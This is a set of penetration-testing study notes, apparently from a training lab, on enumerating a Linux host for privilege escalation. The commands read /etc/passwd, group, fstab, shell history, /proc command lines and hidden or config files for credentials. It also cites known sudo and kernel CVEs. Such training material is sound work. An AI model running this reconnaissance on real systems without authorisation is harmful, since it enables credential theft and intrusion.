Linux Privilege Escalation — Environment & Services Enumeration Notes
Environment Enumeration

Enumeration is the key to privilege escalation. Several helper scripts such as LinPEAS and LinEnum exist to assist with enumeration, but it is equally important to understand what pieces of information to look for and to be able to perform enumeration manually. When you gain initial shell access to a host, there are several key details you must check immediately. The three most critical starting points are the OS version, the kernel version, and the running services. The OS version tells you what distribution you are dealing with and what tools are likely available. The kernel version tells you whether any public kernel exploits apply to this specific machine. Running services reveal what is exposed and whether anything vulnerable is running as root, which is often a direct and easy path to privilege escalation. Always enumerate manually even when automated tools are available — understanding what each command does and what the output means is what makes you effective in environments where tools cannot be transferred.

OS Version — Knowing the distribution gives you an idea of what tools are available and what public exploits may exist for that version.

Kernel Version — There may be public exploits targeting a specific kernel version. Kernel exploits can cause system instability or a complete crash, so be careful running them against production systems and make sure you fully understand the exploit before running it.

Running Services — Services running as root are especially important. A misconfigured or vulnerable root-level service can be an easy win. Known examples include CVE-2016-9566, a local privilege escalation flaw in Nagios Core < 4.2.4. Flaws have also been found in Exim, Samba, and ProFTPd.

Gaining Situational Awareness

After landing a shell, the very first question to answer is what operating system are we dealing with. If you landed on CentOS or Red Hat, your enumeration approach will differ from landing on a Debian-based system like Ubuntu. Landing on something more obscure like FreeBSD, Solaris, HP-UX, or IBM AIX means the commands themselves may differ, though the underlying principles remain the same. The goal in this phase is to orient yourself as quickly as possible and gather the highest-value information first. Run a few basic commands immediately to understand who you are, where you are, what the machine is named, what network it is in, and whether there is any low-hanging sudo fruit available. Screenshots of this initial information are valuable for client reports as evidence of successful Remote Code Execution and to identify the affected system clearly. Anyone can re-type commands from a cheat sheet, but a deep understanding of what you are looking for and how to obtain it will help you be successful in any environment.

Run these five commands immediately after getting a shell:

whoami       — shows what user you are running as
id           — shows UID, GID, and all supplementary group memberships
hostname     — reveals the server name; naming conventions can hint at the machine's role
ifconfig / ip a  — shows network interfaces and what subnet you landed in
sudo -l      — lists what commands your user can run with sudo; NOPASSWD entries are instant wins
Checking OS Version

The /etc/os-release file is the standard and most reliable way to identify the operating system distribution and version on any modern Linux system. This file is present on virtually all current Linux distributions and provides structured key-value information about the OS name, version, version ID, home URL, and codename. Knowing the exact version lets you cross-reference against the vendor's lifecycle page to determine if the system is still receiving security updates. An out-of-date or end-of-life system is far more likely to be vulnerable to public kernel exploits and known CVEs. For example, Ubuntu 20.04 LTS "Focal Fossa" is supported until April 2030 and is likely well-patched, whereas an EOL system will have no patches applied and may be vulnerable to many known exploits. Always check this regardless of what you assume because patch status is never guaranteed and the customer may have neglected updates on internal systems even while patching internet-facing ones.

$ cat /etc/os-release

NAME="Ubuntu"
VERSION="20.04.4 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.4 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
Checking PATH and Environment Variables

The PATH variable defines the ordered list of directories the Linux system searches whenever a command is typed without a full absolute path. For example when you type id, the system searches each directory in PATH until it finds /usr/bin/id. If PATH is misconfigured for a privileged user or a SUID binary calls commands using relative paths, it can be abused to hijack command execution and escalate privileges — this is known as PATH hijacking. The env command dumps all currently set environment variables for the current user session. This is worth scanning carefully because developers and administrators sometimes leave sensitive values hardcoded into environment variables such as database passwords, API tokens, or AWS credentials. Always record the PATH and note any unusual or writable directories within it for later analysis when examining SUID binaries and sudo-allowed scripts. Also look for variables like LD_PRELOAD and LD_LIBRARY_PATH which can sometimes be abused when sudo preserves environment variables.

$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

$ env
SHELL=/bin/bash
PWD=/home/htb-student
LOGNAME=htb-student
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/htb-student
LANG=en_US.UTF-8
<SNIP>
Checking Kernel Version

The kernel version is one of the most important details to record during enumeration because entire categories of privilege escalation exploits target specific kernel version ranges. Well-known kernel exploits include DirtyCow (CVE-2016-5195), DirtyPipe (CVE-2022-0847), and PwnKit (CVE-2021-4034), each of which applies only to specific version ranges. The uname -a command prints the full kernel version string including the machine name, kernel release number, build number, date compiled, and CPU architecture. This string is what you search against on exploit-db.com or with searchsploit to find applicable PoCs. The architecture field (x86_64, ARM) is also critical because compiled kernel exploit binaries are architecture-specific and will not run if mismatched. An alternative way to get the same information is cat /proc/version. Always note down the full kernel string and search for it even if the OS appears patched — internal systems are often neglected.

$ uname -a
Linux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

$ cat /proc/version
Linux version 5.4.0-122-generic (buildd@lcy02-amd64-059) ...
Checking CPU Information

The lscpu command provides detailed information about the CPU architecture and hardware environment. The most immediately relevant fields are the architecture (x86_64, ARM, MIPS), the number of CPUs, the vendor, and the hypervisor vendor. Knowing the architecture is essential because compiled exploit binaries must match the target architecture exactly or they will fail to execute. The hypervisor vendor field tells you whether you are inside a virtual machine such as VMware, KVM, or Hyper-V, which is useful context for understanding the environment and can affect certain exploit compatibility. The CPU count can suggest whether you are on a shared hosting environment where timing-based attacks might be less reliable. While CPU information does not directly give you a privilege escalation vector it is essential context for compiling, transferring, and executing exploit payloads correctly on the target system. This information also goes into the penetration test report to document the assessed system's hardware profile.

$ lscpu

Architecture:                    x86_64
CPU op-mode(s):                  32-bit, 64-bit
Byte Order:                      Little Endian
CPU(s):                          2
Vendor ID:                       AuthenticAMD
Model name:                      AMD EPYC 7302P 16-Core Processor
Hypervisor vendor:               VMware
<SNIP>
Checking Login Shells

The /etc/shells file lists all valid login shells registered on the system. This matters for privilege escalation because outdated shell versions carry known vulnerabilities — Bash versions older than 4.3 are vulnerable to the Shellshock exploit (CVE-2014-6271), which allows code execution via crafted environment variables. Beyond shell versions, the presence of terminal multiplexers like tmux and screen listed as valid shells indicates they are installed and available on the system. If another user, particularly a privileged one, has an active tmux or screen session running, and you can access the socket, you can attach to their session and inherit their privileges entirely. Restricted shells like rbash can sometimes be escaped using known techniques. Users whose shell is set to /usr/sbin/nologin or /bin/false cannot log in interactively, which is important to know when planning lateral movement attempts between accounts.

$ cat /etc/shells

# /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/tmux
/usr/bin/screen
Checking Security Defenses

Before attempting any privilege escalation techniques it is important to determine what security controls are in place on the target system. This prevents wasting time on techniques that will be blocked and helps avoid triggering alerts from monitoring systems. The key defenses to check for are Exec Shield, iptables, AppArmor, SELinux, Fail2ban, Snort, and UFW (Uncomplicated Firewall). AppArmor and SELinux are mandatory access control frameworks that enforce per-process security policies and can block even root-level actions if their profiles are set to enforcing mode. Fail2ban monitors authentication logs and bans IPs after repeated failures — important to know before attempting any brute force against local services. Snort is an intrusion detection system that may alert on aggressive scanning or exploit attempts. Most of the time you will not have read access to the full configurations of these defenses, but simply knowing they exist shapes your attack strategy significantly and tells you what to avoid.

Things to look for:
Exec Shield
iptables
AppArmor
SELinux
Fail2ban
Snort
Uncomplicated Firewall (ufw)
Checking Drives and Block Devices

The lsblk command enumerates all block devices attached to the system including hard disks, USB drives, and optical drives, along with their sizes, types, and whether they are currently mounted. Unmounted partitions are particularly interesting because they may contain backup data, old configuration files, sensitive documents, or even a separate /etc directory with its own shadow file that you can read. If you can mount an unmounted partition and read its contents you may find credentials or other material useful for privilege escalation. The lpstat command checks for any printers attached to the system and any active or queued print jobs, which can occasionally reveal sensitive printed documents. You should also check /etc/fstab carefully for NFS or SMB mount entries that include credentials hardcoded directly in the options field, which administrators sometimes do for convenience and automation purposes.

$ lsblk

NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0                       7:0    0   55M  1 loop /snap/core18/1705
sda                         8:0    0   20G  0 disk
├─sda1                      8:1    0    1M  0 part
├─sda2                      8:2    0    1G  0 part /boot
└─sda3                      8:3    0   19G  0 part
  └─ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /
sr0                        11:0    1  908M  0 rom
Checking /etc/fstab

The /etc/fstab file defines all filesystem mount points configured to mount automatically at boot. This file is readable by all users and is worth examining closely for two reasons. First, administrators sometimes embed credentials directly into mount options for NFS or SMB shares, making them visible to any user who can read the file. Searching for keywords like password, username, and credential within this file using grep can quickly surface any such secrets. Second, the file reveals what filesystems exist on the system that are not currently mounted — these are candidates for manual mounting to explore their contents for sensitive data. Use cat /etc/fstab | grep -v "#" | column -t to view only the active entries in a clean readable format and identify any unmounted filesystems worth investigating further with manual mounting.

$ cat /etc/fstab

/dev/disk/by-id/dm-uuid-LVM-BdLsBLE4... / ext4 defaults 0 0
/dev/disk/by-uuid/20b1770d-a233-4780... /boot ext4 defaults 0 0

$ cat /etc/fstab | grep -v "#" | column -t

UUID=5bf16727-...  /          ext4  errors=remount-ro  0  1
UUID=BE56-AAE0     /boot/efi  vfat  umask=0077         0  1
/swapfile          none       swap  sw                 0  0
Checking Routing Table and ARP Cache

The routing table reveals what other networks are reachable from the compromised host through which interface. This is critical for identifying internal subnets that were not visible during external reconnaissance and that can be reached via pivoting tools like Chisel, SSHuttle, or Ligolo-ng. The route or netstat -rn commands display the kernel IP routing table. Any non-default route entry pointing to an internal subnet is a pivot target. The ARP cache (arp -a) shows IP-to-MAC address mappings for hosts the target has recently communicated with — these are your most immediately reachable pivot targets because they are actively used systems in the same network segment. In a domain environment, always check /etc/resolv.conf — if it points to an internal DNS server IP you are almost certainly dealing with an Active Directory environment and AD enumeration should follow.

$ route

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         _gateway        0.0.0.0         UG    0      0        0 ens192
10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192

$ netstat -rn

$ arp -a
_gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192

$ cat /etc/resolv.conf
User Enumeration via /etc/passwd

The /etc/passwd file stores information about every user account on the system and is readable by all users. Each line contains seven colon-separated fields: username, password placeholder, UID, GID, GECOS comment field, home directory, and login shell. Reading this file tells you every account that exists, what their UIDs are (UIDs below 1000 are typically system accounts), what home directories they have, and what shell they use. Users with /usr/sbin/nologin or /bin/false as their shell cannot log in interactively. On older or embedded systems the password field may contain an actual hash instead of x, which is directly crackable offline. The command grep "sh$" /etc/passwd filters to only users who have an actual login shell, narrowing down which accounts are worth targeting for lateral movement or credential reuse attacks.

$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
htb-student:x:1008:1008::/home/htb-student:/bin/bash
<SNIP>

$ cat /etc/passwd | cut -f1 -d:

root
daemon
mrb3n
htb-student
<SNIP>

$ grep "sh$" /etc/passwd

root:x:0:0:root:/root:/bin/bash
mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
cliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash
htb-student:x:1008:1008::/home/htb-student:/bin/bash

Password Hash Algorithm Reference:

$1$...       — Salted MD5
$5$...       — SHA-256
$6$...       — SHA-512
$2a$...      — BCrypt
$7$...       — Scrypt
$argon2i$... — Argon2
Existing Groups — Checking /etc/group

The /etc/group file lists every group on the system along with its GID and member usernames. Group membership is one of the most important privilege escalation vectors on Linux because certain groups grant near-immediate root access through completely different mechanisms. The sudo group allows members to run commands as root. The docker group allows mounting the host root filesystem into a container. The lxd group allows creating privileged containers with the same effect. The disk group allows direct read access to block devices meaning you can read /etc/shadow straight off disk without going through filesystem permissions. The adm group gives read access to system log files which may contain credentials or session tokens. Use getent group <groupname> to query group membership, which is more reliable than parsing /etc/group directly on systems using LDAP or NIS for authentication.

$ cat /etc/group

root:x:0:
adm:x:4:syslog,htb-student
sudo:x:27:mrb3n,htb-student
docker:x:999:
lxd:x:998:
<SNIP>

$ getent group sudo
sudo:x:27:mrb3n
Checking Home Directories

The /home directory contains subdirectories for each non-system user who has been created on the system. Enumerating each home directory is valuable because users frequently store sensitive data, credentials, and private keys in their home folders without applying appropriate file permissions. The most valuable files to look for are .bash_history which may contain passwords passed as CLI arguments, .ssh/id_rsa for SSH private keys, .ssh/authorized_keys which shows what keys can authenticate to that account, and application configuration files that store hardcoded credentials. If SSH keys are found always cross-reference them against the ARP cache and any internal hostnames discovered to identify where those keys can be used. Finding any credentials anywhere should trigger an immediate attempt to reuse them across all user accounts — password reuse is extremely common in real-world environments.

$ ls /home

administrator.ilfreight  bjones       htb-student  mrb3n   stacey.jenkins
backupsvc                cliff.moore  logger       shared
Mounted File Systems

The df -h command shows all currently mounted filesystems along with their sizes, used space, available space, and mount points. Mounted filesystems beyond the standard system directories — for example large /opt, /srv, or /data mounts — often contain application data, backup archives, or configuration files worth examining closely. Different filesystem types such as ext4, NTFS, and FAT32 can all be mounted on Linux with appropriate drivers. File systems that can be read and written to by the user are called read/write filesystems. Mounting a filesystem allows the user to access the files and folders stored on it. In order to mount a filesystem the user must have root privileges, which means that if you can escalate to root you unlock access to any unmounted filesystem on the system. Always check what is mounted and what its permissions are.

$ df -h

Filesystem      Size  Used Avail Use% Mounted on
udev            1.9G     0  1.9G   0% /dev
tmpfs           389M  1.8M  388M   1% /run
/dev/sda5        20G  7.9G   11G  44% /
tmpfs           1.9G     0  1.9G   0% /dev/shm
/dev/sda1       511M  4.0K  511M   1% /boot/efi
/dev/sr0        3.6G  3.6G     0 100% /media/htb-student/Ubuntu 20.04.5 LTS amd64
<SNIP>
Unmounted File Systems

When a filesystem is unmounted it is no longer accessible by the system and its contents are invisible to normal users. Administrators sometimes intentionally leave filesystems unmounted to prevent standard users from viewing files, scripts, documents, and other sensitive information stored there. If you can extend your privileges to the root user you can mount and read these filesystems freely. Unmounted filesystems are identified by looking at /etc/fstab entries that do not have a corresponding active mount in the df output. These are prime targets once root is achieved as they may contain backup data, historical configs, or other sensitive material that the admin assumed was safely hidden by keeping it unmounted. Always compare df -h output against /etc/fstab to spot the difference.

$ cat /etc/fstab | grep -v "#" | column -t

UUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1
UUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1
/swapfile                                  none       swap  sw                 0  0
All Hidden Files

Linux hides files and directories whose names begin with a dot from standard ls output. These hidden files frequently contain sensitive configuration, session data, and credentials that are not immediately visible to a casual observer. The most valuable hidden files to locate are .bash_history for command history, .ssh/ directory for SSH keys, .netrc for FTP and HTTP credentials in plaintext, .gitconfig for git tokens and usernames, .aws/credentials for AWS access keys, and various application config directories stored under .config/. The find command with the -name ".*" pattern locates all hidden files recursively across the filesystem. The 2>/dev/null at the end suppresses permission denied errors from directories you cannot read, keeping the output clean and focused on results you can actually access and use.

$ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student

-rw-r--r-- 1 htb-student htb-student 3771 Nov 27 11:16 /home/htb-student/.bashrc
-rw-rw-r-- 1 htb-student htb-student  180 Nov 27 11:36 /home/htb-student/.wget-hsts
-rw------- 1 htb-student htb-student  387 Nov 27 14:02 /home/htb-student/.bash_history
-rw-r--r-- 1 htb-student htb-student  807 Nov 27 11:16 /home/htb-student/.profile
-rw-r--r-- 1 htb-student htb-student    0 Nov 27 11:31 /home/htb-student/.sudo_as_admin_successful
-rw-r--r-- 1 htb-student htb-student  220 Nov 27 11:16 /home/htb-student/.bash_logout
-rw-rw-r-- 1 htb-student htb-student  162 Nov 28 13:26 /home/htb-student/.notes
All Hidden Directories

Just like hidden files, hidden directories beginning with a dot are not shown by ls without the -a flag and are frequently used to store application data, SSH keys, GPG keyrings, cache directories, and other sensitive runtime data. The .ssh/ directory is the most valuable — it contains private keys, known_hosts, and authorized_keys. The .gnupg/ directory stores GPG keys which may be used to decrypt encrypted files found elsewhere on the system. The .cache/ and .config/ directories contain application-specific data and configs that often include session tokens and credentials. The find / -type d -name ".*" -ls command lists all hidden directories with their permissions, owner, size, and modification timestamps, which helps prioritise which directories to investigate first based on recency and ownership.

$ find / -type d -name ".*" -ls 2>/dev/null

684822  4 drwx------ 3 htb-student htb-student 4096 Nov 28 12:32 /home/htb-student/.gnupg
790793  4 drwx------ 2 htb-student htb-student 4096 Oct 27 11:31 /home/htb-student/.ssh
684804  4 drwx------ 10 htb-student htb-student 4096 Oct 27 11:30 /home/htb-student/.cache
790827  4 drwxrwxr-x 8 htb-student htb-student 4096 Oct 27 11:32 /home/htb-student/CVE-2021-3156/.git
684796  4 drwx------ 10 htb-student htb-student 4096 Oct 27 11:30 /home/htb-student/.config
280101  4 drwxrwxrwt 2 root        root        4096 Nov 28 12:31 /tmp/.font-unix
262364  4 drwxrwxrwt 2 root        root        4096 Nov 28 12:32 /tmp/.ICE-unix
Temporary Files

Linux has three main temporary file directories that are visible and readable by all users on the system: /tmp, /var/tmp, and /dev/shm. The key distinction between them is data retention time. Files in /tmp are automatically deleted after ten days and are also wiped entirely on system reboot — making them suitable only for truly short-lived temporary data. Files in /var/tmp persist for up to 30 days and survive reboots, meaning they are used by programs that need to retain temporary data between sessions. This makes /var/tmp significantly more likely to contain meaningful artifacts from cron jobs, backup scripts, or other automated processes. The /dev/shm directory is a RAM-based tmpfs used by processes for inter-process communication and may contain sensitive runtime data written by applications. Always check all three.

$ ls -l /tmp /var/tmp /dev/shm

/dev/shm:
total 0

/tmp:
total 52
-rw------- 1 htb-student htb-student    0 Nov 28 12:32 config-err-v8LfEU
drwx------ 3 root        root        4096 Nov 28 12:37 snap.snap-store
drwx------ 2 htb-student htb-student 4096 Nov 28 12:32 ssh-OKlLKjlc98xh
<SNIP>

/var/tmp:
total 28
drwx------ 3 root root 4096 Nov 28 12:31 systemd-private-7b455e62ec09484b87eff41023c4ca53-colord.service-RrPcyi
Linux Services and Internals Enumeration

After completing the basic environment enumeration the next phase is to dig deeper into the internals of the host. This means looking at the internal configuration and way of working including services, applications, scheduled tasks, network connections, user activity, history files, and what tools are available. The questions to answer in this phase include: what services and applications are installed, what services are currently running, what sockets are in use, who is currently logged in and who has logged in recently, what password policies are enforced, whether the host is domain-joined, what interesting information exists in history and log files, what files have been modified recently, whether there are cron jobs that can be hijacked, and what useful tools like netcat, python, perl, gcc, and nmap are present. Each of these answers either points directly to a privilege escalation vector or informs how you will deliver and execute your payload.

Network Interfaces

The ip a command displays all network interfaces on the system along with their assigned IP addresses, subnet masks, broadcast addresses, and states. This is more reliable than ifconfig on modern systems because ifconfig requires the net-tools package which is not always installed. The primary reason to run this command is to discover additional network interfaces beyond the one you came in through. A host with multiple NICs is connected to multiple subnets, which means it can serve as a pivot point into internal network segments completely unreachable from your attack machine. The loopback interface at 127.0.0.1 is always present and any services listening only on loopback are invisible from outside — these are worth probing locally once on the machine. IPv6 addresses should also be noted as some services listen only on IPv6 and may not appear in IPv4 scans.

$ ip a

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host

2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.129.203.168/16 brd 10.129.255.255 scope global dynamic ens192
    inet6 dead:beef::250:56ff:feb9:ed2a/64 scope global dynamic
    inet6 fe80::250:56ff:feb9:ed2a/64 scope link
Hosts File

The /etc/hosts file is a static local DNS table that maps hostnames to IP addresses directly on the local machine, bypassing any DNS server lookup. This file is valuable during enumeration because administrators frequently add internal hostnames for systems that are not in public DNS — internal application servers, database servers, domain controllers, and development systems. Finding internal hostnames in this file reveals the existence of other systems in the environment that you can attempt to reach and pivot to. If the host is part of an Active Directory domain, the domain name and DC hostname may appear here. Any hostname that resolves to a private IP range is a potential lateral movement target. Always cross-reference these hostnames with any SSH keys or credentials you have already discovered.

$ cat /etc/hosts

127.0.0.1   localhost
127.0.1.1   nixlpe02
::1         ip6-localhost ip6-loopback
fe00::0     ip6-localnet
ff00::0     ip6-mcastprefix
ff02::1     ip6-allnodes
ff02::2     ip6-allrouters
User's Last Login

The lastlog command reads from /var/log/lastlog and displays the most recent login time for every user account on the system, along with the port and source IP they connected from. This tells you which accounts are actively used and which have never been logged into. Actively used accounts especially those that have logged in recently from external IPs are worth prioritising for lateral movement because they are more likely to have useful history files, cached credentials, and active sessions worth examining. Accounts that have never logged in are typically service accounts that usually cannot be interactively accessed, but they may still own files or run processes worth examining. The login source IP also reveals what other machines in the network administrators use to connect to this system, giving you additional pivot targets.

$ lastlog

Username         Port     From             Latest
root                                       **Never logged in**
mrb3n            pts/1    10.10.14.15      Tue Aug  2 19:33:16 +0000 2022
cliff.moore      pts/0    127.0.0.1        Tue Aug  2 19:32:29 +0000 2022
stacey.jenkins   pts/0    10.10.14.15      Tue Aug  2 18:29:15 +0000 2022
htb-student      pts/0    10.10.14.15      Wed Aug  3 13:37:22 +0000 2022
Logged In Users

The w command shows who is currently logged into the system, what terminal they are on, where they connected from, when they logged in, how long they have been idle, and what command they are currently running. This is important for operational security — if another user is active on the system while you are enumerating your actions may be visible to them or trigger monitoring alerts. More importantly seeing a privileged user currently logged in may present an opportunity: if they have an active tmux or screen session you can attach to, or if their running command reveals something interesting about what they are doing on the system. The who command and the finger command serve a similar purpose on systems where they are available and installed.

$ w

 12:27:21 up 1 day, 16:55,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
cliff.mo pts/0    10.10.14.16      Tue19   40:54m  0.02s  0.02s -bash
Command History

The history command displays the command history for the current shell session read from the .bash_history file. This is one of the highest-value files to examine during privilege escalation because users frequently pass credentials directly on the command line — database connection strings with passwords, SSH commands, curl commands with Basic Auth headers, git clone commands with tokens embedded in URLs, and similar patterns are all common. Even without explicit credentials the history reveals what the user has been doing on the system: what servers they SSH into, what scripts they run, what databases they access, and what cron or backup tasks they manage. Always check .bash_history for every user whose home directory you can read, not just your own current user's history.

$ history

    1  id
    2  cd /home/cliff.moore
    3  exit
    4  touch backup.sh
    5  tail /var/log/apache2/error.log
    6  ssh ec2-user@dmz02.inlanefreight.local
    7  history
Finding History Files

Beyond the standard .bash_history file, some scripts and programs create their own custom history files to monitor user activity or log executed commands. These can exist anywhere on the filesystem and may be named with patterns like _hist or _history. Finding these custom history files can reveal commands and credentials from processes and scripts that are not captured in the standard shell history. The find command with a pattern match for *_hist and *_history will locate all such files across the filesystem. These are particularly valuable when you find history files belonging to other users or to root because they may reveal the exact commands used to set up services, configure credentials, or perform administrative tasks on the system.

$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history
Cron Jobs

Cron jobs are scheduled tasks on Linux systems equivalent to Windows scheduled tasks. They are commonly set up to perform maintenance, backup, and monitoring tasks on a regular schedule. They are configured in /etc/crontab, in per-user crontabs via crontab -l, and in the /etc/cron.daily/, /etc/cron.weekly/, /etc/cron.hourly/, and /etc/cron.monthly/ directories. Cron jobs running as root are particularly interesting because if the script they execute has weak permissions — a world-writable script or a script in a world-writable directory — you can modify it and have your payload execute the next time the cron job runs. Relative path usage in cron scripts is also exploitable via PATH hijacking. Even if the scripts are not directly writable, understanding what automated tasks run on the system provides context about backup processes and monitoring jobs.

$ ls -la /etc/cron.daily/

total 48
drwxr-xr-x  2 root root 4096 Aug  2 17:36 .
-rwxr-xr-x  1 root root  376 Dec  4  2019 apport
-rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x  1 root root 1123 Feb 25  2020 man-db
-rwxr-xr-x  1 root root  214 Apr  2  2020 update-notifier-common
Proc Filesystem

The proc filesystem /proc is a virtual filesystem dynamically generated by the Linux kernel that exposes real-time information about every running process, hardware state, kernel parameters, and system memory. It does not exist on disk but is generated in memory and reflects the live state of the system at any moment. From a privilege escalation perspective /proc is valuable because each running process has a directory under /proc/<PID>/ containing files like cmdline which holds the full command line the process was started with including all arguments, environ which holds the process's environment variables, and fd/ which lists open file descriptors. Reading these can reveal credentials passed as command-line arguments or environment variables to other processes including those running as root, which may include database passwords or authentication tokens.

$ find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

/sbin/init
/usr/lib/packagekit/packagekitd
root@10.129.14.200
ssh
htb-student
[priv]sshd:
htb-student@pts/2
<SNIP>
Installed Packages

Knowing what software packages are installed on the system is important because any installed package that is outdated or poorly configured is a potential privilege escalation vector. Older versions of common tools and services regularly have public CVEs with available PoC exploits available on exploit-db and in searchsploit. On Debian-based systems apt list --installed produces the full list of installed packages with their version numbers. This list should be saved to a file for further analysis. You can then compare this list against vulnerability databases manually or using automation. The output is piped through tr, cut, and sed to clean it into a usable format of package name and version that can be grepped, searched, and compared. Older Linux systems have a higher likelihood of having vulnerable packages installed especially if they have not been updated recently.

$ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

accountsservice 0.6.55-0ubuntu12~20.04.5
acl 2.2.53-6
apparmor 2.13.3-7ubuntu5.1
anacron 2.3-29
apg 2.2.3.dfsg.1-5
<SNIP>
Sudo Version

Checking the exact version of sudo installed on the system is critical because sudo itself has historically been vulnerable to several serious local privilege escalation exploits. The most well-known is Baron Samedit (CVE-2021-3156), which affected sudo versions before 1.9.5p2 and allowed any local user to gain root privileges through a heap-based buffer overflow. Other sudo vulnerabilities have affected different version ranges over the years. The sudo -V command prints not only the sudo version but also the sudoers policy plugin version and file grammar version. Any version of sudo below 1.9.5p2 should be immediately cross-checked against CVE databases. Even on patched versions, the sudoers configuration itself may contain dangerous misconfigurations discoverable via sudo -l that allow privilege escalation without needing any exploit at all.

$ sudo -V

Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
Binaries

Beyond packaged software, compiled binaries can be dropped directly onto a system in /bin, /usr/bin/, or /usr/sbin/ without going through a package manager, leaving no package installation record. Listing the contents of these directories reveals all available executables on the system. Some of these binaries may have SUID bits set allowing them to run as root regardless of who executes them. Others may simply be powerful tools that can be leveraged to read restricted files, write to privileged locations, or spawn elevated shells if misconfigured. The strace tool is particularly useful for analyzing how a specific binary behaves at the system call level — it traces every syscall the program makes including file opens, network connections, and credential reads, potentially revealing hardcoded passwords or tokens being passed during normal execution.

$ ls -l /bin /usr/bin/ /usr/sbin/

lrwxrwxrwx 1 root root 7 Oct 27 11:14 /bin -> usr/bin

/usr/bin/:
-rwxr-xr-x 1 root root 31248 May 19 2020 aa-enabled
-rwxr-xr-x 1 root root 35344 May 19 2020 aa-exec
<SNIP>

/usr/sbin/:
-rwxr-xr-x 1 root root  3068 May 19 2020 aa-remove-unknown
-rwxr-xr-x 1 root root 60432 Nov 28 2019 acpid
<SNIP>
GTFOBins

GTFOBins is a curated online database of Unix binaries that can be exploited by an attacker to bypass local security restrictions and escalate privileges. Each entry documents exactly how a particular binary can be abused — whether through SUID exploitation, sudo misconfigurations, file read/write capabilities, or shell spawning techniques. The practical approach during enumeration is to compare the list of installed packages and available binaries on the target system against the GTFOBins database to identify which binaries present on the system are potentially exploitable. The one-liner below automates this by fetching the GTFOBins API, extracting all documented binary names, and checking each one against the installed packages list. Any match printed by this command should be immediately investigated using the techniques documented on the GTFOBins website for that specific binary.

$ for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); \
  do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i"; fi; done

Check GTFO for: ab
Check GTFO for: apt
Check GTFO for: ar
Check GTFO for: awk
Check GTFO for: bash
Check GTFO for: bzip2
Check GTFO for: cat
Check GTFO for: cp
Check GTFO for: curl
Check GTFO for: dd
Check GTFO for: diff
<SNIP>
Trace System Calls — strace

The strace tool on Linux-based systems allows you to track and analyze all system calls and signal processing made by a running program. It follows the complete flow of a program's execution and shows how it accesses system resources, processes signals, and sends and receives data from the operating system. From a security perspective strace is valuable for monitoring what a binary does at runtime — particularly useful for identifying specific requests made to remote hosts using passwords or tokens embedded in the syscall arguments. It can also reveal what files a program opens, what network connections it makes, and what data it reads and writes. The output of strace can be written to a file for later offline analysis using the -o flag. This is particularly useful for analyzing SUID binaries or root-owned services to understand their behavior before attempting to exploit them.

$ strace ping -c1 10.129.112.20

execve("/usr/bin/ping", ["ping", "-c1", "10.129.112.20"], ...) = 0
access("/etc/suid-debug", F_OK) = -1 ENOENT
access("/etc/ld.so.preload", R_OK) = -1 ENOENT
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libidn2.so.0", O_RDONLY) = 3
socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP) = 3
connect(5, {sa_family=AF_INET, sin_port=htons(1025), sin_addr=inet_addr("10.129.112.20")}, 16) = 0
sendto(3, "...", 64, 0, {sa_family=AF_INET, sin_addr=inet_addr("10.129.112.20")}, 16) = 64
write(1, "64 bytes from 10.129.112.20: icmp_seq=...", 57) = 57
exit_group(0) = ?
Configuration Files

Configuration files control how every service and application on the system behaves and they frequently contain sensitive information including database credentials, API keys, private tokens, internal hostnames, and file paths to restricted resources. The find command with -name *.conf -o -name *.config locates all configuration files across the entire filesystem. Even if you cannot read the directory containing a configuration file, Linux permissions allow reading the file directly if the file itself has read permissions for your user — so always attempt to read specific known config files even when directory listing is denied. Web application configurations are especially valuable as files like wp-config.php, .env, database.yml, and settings.py routinely contain plaintext database passwords that can then be reused across accounts. Administrators often copy credentials between config files for convenience.

$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

